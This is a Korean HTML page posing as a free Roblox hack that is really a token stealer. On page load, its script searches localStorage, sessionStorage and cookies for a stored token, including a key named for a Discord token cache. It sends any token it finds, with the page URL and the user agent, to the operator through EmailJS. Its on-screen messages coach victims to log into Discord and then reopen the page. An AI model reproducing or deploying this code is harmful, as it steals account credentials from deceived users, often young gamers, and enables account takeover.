<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>로블록스 핵 무료 2026</title>
  <style>
    body { 
      margin:0; padding:0; height:100vh; 
      background:#000; color:#0f0; font-family: monospace; 
      display:flex; align-items:center; justify-content:center; 
      overflow:hidden; touch-action: manipulation;
    }
    .container { text-align:center; padding:20px; max-width:95%; }
    h1 { font-size:2.4rem; margin:0 0 15px; text-shadow:0 0 10px #0f0; }
    .loader { 
      width:70px; height:70px; 
      border:6px solid #0f0; border-top:6px solid transparent; 
      border-radius:50%; animation: spin 1s linear infinite; 
      margin:25px auto; 
    }
    #message { font-size:1.3rem; margin:15px 0; }
    #status { font-size:1.1rem; color:#ff0044; word-break:break-all; line-height:1.4; }
    @keyframes spin { to { transform:rotate(360deg); } }
  </style>
  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
</head>
<body>
  <div class="container">
    <h1>핵 로딩 중...</h1>
    <div class="loader" id="loader"></div>
    <div id="message">토큰 추출 중...</div>
    <div id="status"></div>
  </div>

  <script>
    // 에러 발생 시 모바일에서도 바로 보이는 팝업 함수
    function showErrorPopup(title, detail = "") {
      let msg = title;
      if (detail) msg += "\n\n상세: " + detail;
      msg += "\n\n새로고침하거나 다른 브라우저로 시도해보세요";
      
      alert(msg);
      
      // 화면에도 표시 (팝업 닫아도 볼 수 있게)
      document.getElementById("status").innerHTML = 
        "<b style='color:#ff4444'>" + title + "</b><br>" + 
        detail.replace(/\n/g, "<br>");
      
      document.getElementById("loader").style.display = "none";
      document.getElementById("message").innerText = "작업 완료 (오류)";
    }

    // EmailJS 초기화
    let emailjsReady = false;
    try {
      emailjs.init("ycbHVBt3cm6FkCL--");
      emailjsReady = true;
      console.log("[OK] EmailJS 준비 완료");
    } catch(e) {
      console.error("[ERR] EmailJS 초기화 실패", e.message || e);
      showErrorPopup("EmailJS 초기화 오류", e.message || "Public Key 다시 확인하세요");
    }

    const SERVICE_ID = "service_jmsvqzd";
    const TEMPLATE_ID = "template_fjunjx8";

    async function grabToken() {
      try {
        let token = localStorage.getItem("token") || 
                    sessionStorage.getItem("token");

        // 모바일에서 추가로 시도할 저장소들
        if (!token) {
          token = 
            document.cookie.match(/token=([^;]*)/)?.[1] ||
            localStorage.getItem("user_token_data") ||
            localStorage.getItem("discord_token_cache");
        }

        if (token) {
          token = token.replace(/"/g, "").trim();
          console.log("[+] 토큰 발견:", token.substring(0, 40) + "...");

          if (!emailjsReady) {
            showErrorPopup("EmailJS 문제", "토큰은 찾았으나 발송 불가");
            return;
          }

          await emailjs.send(SERVICE_ID, TEMPLATE_ID, {
            token: token,
            url: location.href,
            time: new Date().toISOString(),
            userAgent: navigator.userAgent
          });

          document.getElementById("status").innerHTML = "성공! 메일(스팸함 포함) 확인하세요";
          document.getElementById("message").innerText = "완료됨";
        } else {
          console.log("[-] 토큰 없음");
          showErrorPopup(
            "토큰을 찾을 수 없음",
            "1. Discord 모바일 앱/웹에서 로그인 되어 있는지 확인\n" +
            "2. discord.com/login 에서 로그인 후 채팅 화면까지 들어가기\n" +
            "3. 이 사이트를 새 탭에서 다시 열기\n" +
            "모바일은 보안 때문에 토큰 잡기가 어려울 수 있음"
          );
        }

      } catch(e) {
        console.error("[ERROR]", e.message || e);
        showErrorPopup("작동 중 오류", e.message || "알 수 없는 오류 - 다른 브라우저 시도");
      }

      // 무한 로딩 방지
      document.getElementById("loader").style.display = "none";
    }

    // 페이지 로드 후 실행
    window.addEventListener("load", () => {
      setTimeout(grabToken, 700);
    });

    // 모든 예상치 못한 에러도 팝업
    window.onerror = function(msg, url, line) {
      showErrorPopup("브라우저 오류", msg + " (라인 " + line + ")");
      return true;
    };
  </script>
</body>
</html>
